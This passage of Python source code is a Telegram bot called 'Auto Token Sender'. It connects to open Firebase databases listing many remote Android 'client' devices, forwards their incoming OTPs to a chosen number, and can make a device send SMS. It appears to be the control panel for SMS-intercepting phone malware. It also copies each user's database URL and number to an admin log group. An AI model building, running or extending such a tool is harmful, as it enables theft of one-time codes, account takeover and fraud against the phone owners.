        try: tid = int(args[0])
        except: _reply(message, "❌ Invalid user ID.", kb=None); return
        banned_users.discard(tid); save()
        _reply(message, f"✅ User <code>{tid}</code> unbanned.", kb=None)

    elif cmd == "promoteuser":
        if not args:
            _reply(message, "Usage: /promoteuser &lt;user_id&gt;", kb=None); return
        try: tid = int(args[0])
        except: _reply(message, "❌ Invalid user ID.", kb=None); return
        premium_users.add(tid); save()
        try: bot.send_message(tid, "⭐ You've been promoted to Premium! Enjoy.")
        except: pass
        _reply(message, f"⭐ User <code>{tid}</code> promoted to premium.", kb=None)

    elif cmd == "adminhelp":
        _reply(message, _admin_help(), kb=None)

# ══════════════════════════════════════════════════════════════
#  /start
# ══════════════════════════════════════════════════════════════
@bot.message_handler(commands=["start"])
def cmd_start(message):
    uid=message.from_user.id
    if uid in banned_users:
        _send(uid,"🚫 Your access has been suspended. Contact support."); return
    is_new=uid not in user_all
    user_all.add(uid); save()

    if REQUIRED_GROUP and uid!=MASTER_ADMIN_ID:
        if not check_access(uid):
            join_prompt(uid)
            return

    _send(uid,f"""
🚀 <b>AUTO TOKEN SENDER</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Real-time OTP Forwarding
🔒 Multi-Firebase Support
🎯 Accurate SMS Detection

━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>SETUP — 4 STEPS</b>
1️⃣ Add Firebase
2️⃣ Set Forward No.
3️⃣ Setup Firebase → Device → SIM
4️⃣ Start Session ✅

Tap 📖 Guide for full instructions.""")

    if is_new:
        track("users")
        tag=utag(message)
        name=message.from_user.full_name or "—"
        uname=f"@{message.from_user.username}" if message.from_user.username else "—"
        info=f"""
🆕 <b>NEW USER</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 Name     : {_safe(name)}
🔗 Username : {_safe(uname)}
🆔 ID       : <code>{uid}</code>
🕐 Joined   : {ts()}
👥 Total    : {len(user_all)}"""
        _to_admin(info)
        _to_group(info)
        log_master(f"users/{uid}",{"name":name,"tag":tag,"joined":ts()})

def _log_action(uid, tag, action):
    _to_group(f"👤 {_safe(tag)} (<code>{uid}</code>) → {action}\n🕐 {tshort()}")

# ══════════════════════════════════════════════════════════════
#  /debug
# ══════════════════════════════════════════════════════════════
@bot.message_handler(commands=["debug"])
def cmd_debug(message):
    uid = message.from_user.id
    sess = user_session.get(uid)
    chs  = user_channel.get(uid, {})
    fbs  = user_firebase.get(uid, {})
    ps   = pending_setup.get(uid, {})

    ch_id    = chs.get("id","—")
    ch_title = _safe(chs.get("title","—"))
    cid      = _safe(sess.get("client_id","—")) if sess else "—"
    sim      = f"SIM {sess.get('sim_index',0)+1}" if sess else "—"
    fb_count = len(fbs)
    fb_urls  = [fb.get("url","?")[-30:] for fb in fbs.values()]
    ps_info  = f"✅ Ready (Device: <code>{_safe(ps.get('cid','?'))}</code> SIM {ps.get('sim_idx',0)+1})" if ps and ps.get('cid') else "⚠️ Not configured"

    _send(message.chat.id, f"""
🔧 <b>DEBUG INFO</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>Channel/Group:</b>
  Title : {ch_title}
  ID    : <code>{ch_id}</code>

<b>Session:</b>
  Active: {"🟢 YES" if sess else "🔴 NO"}
  Device: <code>{cid}</code>
  SIM   : {sim}

<b>Pending Setup:</b> {ps_info}

<b>Firebase:</b>
  Count : {fb_count}
  URLs  : {chr(10).join(_safe(u) for u in fb_urls) or "—"}

<b>Forward No:</b> <code>{_safe(fwd_number.get(uid,"—"))}</code>

<b>Test: send this to your group</b>
<code>To: +919999999999
Message: TEST TOKEN 12345</code>
━━━━━━━━━━━━━━━━━━━━━━
If channel ID is "—", tap 📢 Add Channel first.
If Pending Setup shows "Not configured", run ⚙️ Setup Firebase again.""", kb=None)

# ══════════════════════════════════════════════════════════════
#  MAIN MESSAGE HANDLER (private chats)
# ══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.chat.type=="private")
def on_msg(message):
    uid=message.from_user.id
    text=message.text.strip() if message.text else ""
    tag=utag(message)

    # Ban check
    if uid in banned_users:
        _send(uid,"🚫 Your access has been suspended. Contact support.", kb=types.ReplyKeyboardRemove()); return

    # Access check
    if REQUIRED_GROUP and uid!=MASTER_ADMIN_ID and not check_access(uid):
        join_prompt(uid); return

    if text in BUTTONS: user_states.pop(uid,None)
    state=user_states.get(uid)

    # Session lock for Firebase operations
    if text in {"🔥 Add Firebase","⚙️ Setup Firebase"} and uid in user_session:
        cid=user_session[uid].get("client_id","?")
        _send(uid,f"🔒 Session active on <code>{_safe(cid)}</code>\n\nTap ⏹️ <b>Stop Session</b> first.")
        return

    if text=="🔥 Add Firebase":
        user_states[uid]="fb_url"
        _rm(uid,"🔥 <b>Add Firebase</b>\n\nSend your Realtime Database URL:")

    elif text=="⚙️ Setup Firebase":
        fbs=user_firebase.get(uid,{})
        if not fbs: _send(uid,"❌ No Firebase added.\nTap 🔥 Add Firebase first."); return
        _send(uid,"⚙️ <b>Select Firebase:</b>",kb=fb_kb(uid,"setup"))

    elif text=="📢 Add Channel":
        user_states[uid]="ch"
        _rm(uid,"📢 <b>Add Channel</b>\n\nSend channel username or ID:")

    elif text=="📬 Set Forward No.":
        user_states[uid]="fwd"
        cur=fwd_number.get(uid,"—")
        _rm(uid,f"📬 <b>Set Forward No.</b>\n\nCurrent: <code>{_safe(cur)}</code>\n\nSend new number:")

    elif text=="▶️ Start Session":
        if not fwd_number.get(uid): _send(uid,"❌ Set Forward Number first."); return
        ps=pending_setup.get(uid)
        if not ps or not ps.get("cid"):
            fbs=user_firebase.get(uid,{})
            if not fbs: _send(uid,"❌ Add Firebase first."); return
            _send(uid,"⚙️ Run ⚙️ Setup Firebase to select device + SIM first."); return
        cid=ps["cid"]; fid=ps["fid"]; sim_idx=ps.get("sim_idx",0)
        db=ps.get("db")
        if not db:
            # Try to reconnect
            fb=user_firebase.get(uid,{}).get(fid)
            if fb: db=fb.get("db"); pending_setup[uid]={**ps,"db":db}
        if not db:
            _send(uid,"❌ Firebase connection lost. Please run ⚙️ Setup Firebase again."); return
        num=fwd_number.get(uid,"—")
        if not _start_session(uid,cid,fid,db,message.chat.id,sim_idx,tag): return
        try:
            db.child(f"clients/{cid}/webhookEvent/sendSms").set({
                "from":sim_idx,"isSended":False,
                "message":f"✅ Bot connected. SIM {sim_idx+1} active.","to":norm(num)
            })
        except: pass
        _log_action(uid, tag, f"▶️ Started Session on <code>{_safe(cid)}</code>")
        _send(uid,f"""
▶️ <b>SESSION STARTED</b>
━━━━━━━━━━━━━━━━━━━━━━
📱 Device   : <code>{_safe(cid)}</code>
📡 SIM      : SIM {sim_idx+1}
📲 Forward  : <code>{_safe(num)}</code>
⚡ Speed    : 0.5 seconds
⏱️ Auto-stop: 6 min inactivity""")

    elif text=="⏹️ Stop Session":
        sess=_stop_session(uid)
        cid=sess.get("client_id","?") if sess else "?"
        s=user_stats.get(uid,{})
        _to_group(f"""
⏹️ <b>SESSION STOPPED</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 Admin   : {_safe(tag)} (<code>{uid}</code>)
📱 Device  : <code>{_safe(cid)}</code>
📊 Total   : {s.get('total',0)} SMS
🕐 Time    : {ts()}""")
        _send(uid,f"""⏹️ <b>SESSION STOPPED</b>
━━━━━━━━━━━━━━━━━━━━━━
📱 Device  : <code>{_safe(cid)}</code>
📊 Total   : {s.get('total',0)}
✅ OK      : {s.get('ok',0)}
❌ Failed  : {s.get('fail',0)}""")

    elif text=="📊 Status":
        sess=user_session.get(uid)
        mon="🟢 Running" if sess else "🔴 Stopped"
        cid=sess["client_id"] if sess else "—"
        sim=f"SIM {sess['sim_index']+1}" if sess else "—"
        ps=pending_setup.get(uid)
        rdy=f"✅ Ready (SIM {ps['sim_idx']+1})" if ps and ps.get("cid") else "⚠️ Not configured"
        s=user_stats.get(uid,{})
        rem=""
        if sess:
            secs=int(time.time()-sess.get("start_time",time.time()))
            rem=f"\n⏱️ Running   : {secs//60}m {secs%60}s / 6m"
        _send(uid,f"""📊 <b>STATUS</b>
━━━━━━━━━━━━━━━━━━━━━━
🔍 Monitor   : {mon}{rem}
📱 Device    : <code>{_safe(cid)}</code>
📡 SIM       : {sim}
🔧 Setup     : {rdy}
🔥 Firebase  : {len(user_firebase.get(uid,{}))} added
📲 Forward   : <code>{_safe(fwd_number.get(uid,'—'))}</code>
📢 Channel   : {_safe(user_channel.get(uid,{}).get('title','—'))}
✅ OK        : {s.get('ok',0)}
❌ Failed    : {s.get('fail',0)}
📊 Total     : {s.get('total',0)}
🕐 Updated   : {tshort()}""")

    elif text=="📖 Guide":
        _send(uid,f"""
📖 <b>SETUP GUIDE</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Step 1 — Add Firebase</b>
• console.firebase.google.com → Create project
• Realtime Database → Set rules to true/true
• Copy DB URL → Tap 🔥 Add Firebase → paste

<b>Step 2 — Set Forward Number</b>
• Tap 📬 Set Forward No.
• Send the number to receive OTPs

<b>Step 3 — Add Channel (optional)</b>
• Create Telegram group → Add bot as admin
• Tap 📢 Add Channel → send group ID/username

<b>Step 4 — Setup Firebase</b>
• Tap ⚙️ Setup Firebase → select Firebase
• Send Device ID of your Android phone
• Select SIM 1 or SIM 2

<b>Step 5 — Start Session</b>
• Tap ▶️ Start Session
• OTPs forward in ~0.5 seconds
• Auto-stops after 6 minutes of inactivity

━━━━━━━━━━━━━━━━━━━━━━
💡 <b>Notes</b>
• Setup is saved — survives bot restart ✅
• Cannot add Firebase during active session
• Same device cannot run in two sessions
• Welcome SMS sent when session starts

━━━━━━━━━━━━━━━━━━━━━━
💬 Feedback, complaints, suggestions:
{SUPPORT_USER}""")

    elif text=="🆘 Support":
        _send(uid,f"""
🆘 <b>SUPPORT</b>
━━━━━━━━━━━━━━━━━━━━━━
💬 {SUPPORT_USER}

For issues, feedback, complaints
or suggestions — always available.

⏰ Response within 24 hours""")

    # ── STATE INPUTS ──────────────────────────────────────────
    elif state=="fb_url":
        user_states.pop(uid,None)
        if "firebaseio.com" not in text:
            _send(uid,"❌ Invalid URL. Must contain <code>firebaseio.com</code>"); return
        m2=_rm(uid,"⏳ Connecting...")
        db=_fb_connect(text)
        if not db:
            _edit(m2,'❌ Connection failed.\nCheck URL and rules:\n<code>{"rules":{".read":true,".write":true}}</code>'); return
        user_firebase.setdefault(uid,{})
        fid=str(int(time.time()))
        user_firebase[uid][fid]={"url":text,"db":db}
        save(); track("firebase")
        on,off,tot=_counts(db)
        uname=f"@{message.from_user.username}" if message.from_user.username else "—"
        name=message.from_user.full_name or "—"
        group_msg=f"""
🔥 <b>NEW FIREBASE ADDED</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 Admin    : {_safe(uname)} (<code>{uid}</code>)
📛 Name     : {_safe(name)}
🔥 URL      : <code>{_safe(text)}</code>
🟢 Online   : {on}
🔴 Offline  : {off}
📱 Total    : {tot}
🕐 Time     : {ts()}"""
        _log_action(uid, utag(message), "🔥 Added Firebase")
        _to_group(group_msg)
        log_master(f"users/{uid}/firebase/{fid}",
                   {"url":text,"tag":utag(message),"added":ts(),"on":on,"off":off})
        _edit(m2,f"✅ <b>Firebase Connected</b>\n\n"
               f"🟢 {on} online  ·  🔴 {off} offline  ·  📱 {tot} total")

    elif state=="fwd":
        user_states.pop(uid,None)
        num=norm(text)
        if len(re.sub(r"[^\d]","",num))<10:
            _send(uid,"❌ Invalid number."); user_states[uid]="fwd"; return
        fwd_number[uid]=num; save()
        log_master(f"users/{uid}/forward",{"number":num,"tag":utag(message),"ts":ts()})
        _send(uid,f"✅ Forward number set: <code>{_safe(num)}</code>")

    elif state=="ch":
        user_states.pop(uid,None)
        inp=text.strip()
        try:
            ch=bot.get_chat(int(inp) if inp.lstrip("-").isdigit() else inp)
            user_channel[uid]={"id":ch.id,"title":ch.title or inp}; save()
            log_master(f"users/{uid}/channel",{"id":ch.id,"title":ch.title,"tag":utag(message)})
            _send(uid,f"✅ Channel set: <b>{_safe(ch.title)}</b>")
        except Exception as e:
            _send(uid,f"❌ Channel not found. Make sure bot is admin.\n<code>{_safe(str(e)[:80])}</code>")

    elif state and state.startswith("dev|"):
        fid=state.split("|")[1]
        user_states.pop(uid,None)
        cid=text.strip()
        fb=user_firebase.get(uid,{}).get(fid)
        if not fb: _send(uid,"❌ Firebase not found."); return
        db=fb["db"]
        m2=_rm(uid,f"🔍 Searching <code>{_safe(cid)}</code>...")
        actual_cid,cd=_get_device(db,cid)
        if not cd:
            devs=_list_clients(db)
            if devs:
                online=[f"🟢 <code>{_safe(k)}</code>" for k,on in devs if on][:5]
                offline=[f"🔴 <code>{_safe(k)}</code>" for k,on in devs if not on][:3]
                _edit(m2,f"❌ <b>Device Not Found</b>\n\n"
                        f"<b>Copy an ID and try again:</b>\n"+"\n".join(online+offline))
            else:
                _edit(m2,"❌ No devices in Firebase.\nOpen Android app on your phone.")
            user_states[uid]=f"dev|{fid}"
            return
        bat_raw=str(cd.get("battery","0")).replace("%","").replace(" ","").strip()
        bat=int(bat_raw) if bat_raw.isdigit() else 0
        mdl=_safe(cd.get("modelName",cd.get("model","Device")))
        on,off,_=_counts(db)
        pending_setup[uid]={"fid":fid,"cid":actual_cid,"db":db,"sim_idx":0}
        save()
        _edit(m2,
            f"✅ <b>Device Found</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>{mdl}</b>\n🆔 <code>{_safe(actual_cid)}</code>\n"
            f"🔋 {bat}%  ·  🟢 {on}  ·  🔴 {off}\n\n"
            f"📶 <b>Select SIM:</b>",kb=sim_kb())

# ══════════════════════════════════════════════════════════════
#  CALLBACKS
# ══════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda c: True)
def on_cb(call):
    uid=call.from_user.id
    data=call.data
    _ans(call)

    if data=="verify_join":
        if uid in banned_users:
            _ans(call,"🚫 You are banned from this bot.",alert=True); return
        if is_joined(uid):
            verified_users.add(uid); save()
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            _send(uid,f"""
✅ <b>Verified!</b>

Welcome to Auto Token Sender Bot.

Tap 📖 Guide to get started.""")
        else:
            _ans(call,"❌ You haven't joined yet. Join first, then verify.",alert=True)

    elif data=="cancel":
        user_states.pop(uid,None)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass

    elif data.startswith("setup|"):
        fid=data.split("|")[1]
        fb=user_firebase.get(uid,{}).get(fid)
        if not fb:
            _edit_id(call.message.chat.id,call.message.message_id,"❌ Firebase not found."); return
        db=fb["db"]
        on,off,tot=_counts(db)
        url=fb.get("url","").replace("https://","").replace(".firebaseio.com","")[:25]
        user_states[uid]=f"dev|{fid}"
        _edit_id(call.message.chat.id,call.message.message_id,
            f"🔥 <b>{_safe(url)}</b>\n"
            f"🟢 {on}  ·  🔴 {off}  ·  📱 {tot}\n\n"
            f"📱 <b>Send Device ID:</b>")

    elif data.startswith("sim_"):
        sim_idx=int(data[4:])
        ps=pending_setup.get(uid)
        if not ps:
            _edit_id(call.message.chat.id,call.message.message_id,
                "❌ Expired. Run ⚙️ Setup Firebase again."); return
        pending_setup[uid]={**ps,"sim_idx":sim_idx}
        save()
        cid=ps["cid"]
        fb_url=user_firebase.get(uid,{}).get(ps.get("fid"),{}).get("url","—")
        tag=f"@{call.from_user.username}" if call.from_user.username else str(uid)
        _to_group(f"""
📶 <b>SIM SELECTED</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 Admin    : {_safe(tag)} (<code>{uid}</code>)
📱 Device   : <code>{_safe(cid)}</code>
📡 SIM      : SIM {sim_idx+1}
🔥 Firebase : <code>{_safe(fb_url)}</code>
🕐 Time     : {ts()}""")
        _edit_id(call.message.chat.id,call.message.message_id,
            f"✅ <b>Setup Complete</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 Device : <code>{_safe(cid)}</code>\n"
            f"📡 SIM    : SIM {sim_idx+1}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Tap <b>▶️ Start Session</b> to begin.")

# ══════════════════════════════════════════════════════════════
#  CHANNEL / GROUP
# ══════════════════════════════════════════════════════════════
@bot.channel_post_handler(func=lambda m: True)
def on_ch(m): _outgoing(m)

@bot.message_handler(func=lambda m: m.chat.type in ["group","supergroup"])
def on_grp(m): _outgoing(m)

# ══════════════════════════════════════════════════════════════
#  STARTUP CHECK
# ══════════════════════════════════════════════════════════════
def startup_checks():
    if ADMIN_LOG_GROUP:
        try:
            bot.send_message(ADMIN_LOG_GROUP,
                f"🤖 <b>Bot Started v13.0.0</b>\n🕐 {ts()}\n"
                f"👥 Users: {len(user_all)}\n🟢 Sessions: {len(user_session)}\n"
                f"💾 Data: {DATA_FILE}",
                parse_mode="HTML")
            log.info("✅ ADMIN_LOG_GROUP verified and working")
        except Exception as e:
            log.error(f"❌ ADMIN_LOG_GROUP check failed: {e}")
    else:
        log.warning("⚠️ ADMIN_LOG_GROUP not set — group logs disabled")

    if REQUIRED_GROUP:
        log.info(f"✅ Required group: {REQUIRED_GROUP}")
    else:
        log.info("ℹ️ No required group — open access")

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════
if __name__=="__main__":
    print("╔══════════════════════════════╗")
    print("║  AUTO TOKEN SENDER  v13.1.0 ║")
    print("╚══════════════════════════════╝")
    print(f"💾 Data file: {DATA_FILE}")
    load()
    startup_checks()
    print(f"✅ {len(user_all)} users | {len(user_session)} sessions | 0.5s monitor | Running\n")
    while True:
        try:
            bot.infinity_polling(timeout=60,long_polling_timeout=30,skip_pending=True)
        except Exception as e:
            log.error(f"Poll:{e}"); time.sleep(5)
